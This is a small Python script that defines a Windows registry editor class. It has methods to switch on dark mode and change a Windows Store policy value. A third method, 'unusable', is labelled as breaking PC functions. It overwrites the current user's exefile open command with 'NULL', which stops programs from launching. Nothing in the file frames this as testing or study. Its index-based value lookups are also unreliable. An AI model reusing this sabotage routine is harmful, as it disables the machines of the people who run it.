import winreg
from colorama import Fore, init
init(autoreset=True, convert=True)


class regeditor(object):
    """Registry editors"""

    def darkmode(self):
        """Enable dark theme"""
        try:
            with winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER) as hkey:
                with winreg.OpenKey(hkey, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize",
                                    0, winreg.KEY_ALL_ACCESS) as sub_key:

                    value = winreg.EnumValue(sub_key, 2)
                    print(value)
                    winreg.SetValueEx(
                        sub_key, "SystemUsesLightTheme", 0, winreg.REG_DWORD, 0)
                    print(f"{Fore.GREEN}Changed: {value}")

                    value = winreg.EnumValue(sub_key, 3)
                    print(value)
                    winreg.SetValueEx(
                        sub_key, "AppsUseLightTheme", 0, winreg.REG_DWORD, 0)
                    print(f"{Fore.GREEN}Changed: {value}")
        except Exception as e:
            print(e)

    def enable_store(self):
        """Enables windows store"""
        try:
            with winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER) as hkey:
                with winreg.OpenKey(hkey, r"SOFTWARE\Policies\Microsoft\WindowsStore",
                                    0, winreg.KEY_ALL_ACCESS) as sub_key:
                    value = winreg.EnumValue(sub_key, 2)
                    print(value)
                    winreg.SetValueEx(sub_key, "WindowsStore",
                                      0, winreg.REG_DWORD, 0)
                    print(f"{Fore.GREEN}Changed: {value}")
        except Exception as e:
            print(e)
            
    
    def unusable(self):
        """Will break some pc functions"""
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\Classes\\exefile\\shell\\open\\command")
            value = winreg.EnumValue(key, 0)
            print(value)
            winreg.SetValue(key, "", winreg.REG_SZ, "NULL")
            print(f"{Fore.GREEN}Changed: {value}")    
        except Exception as e:
            print(e)


reg = regeditor()
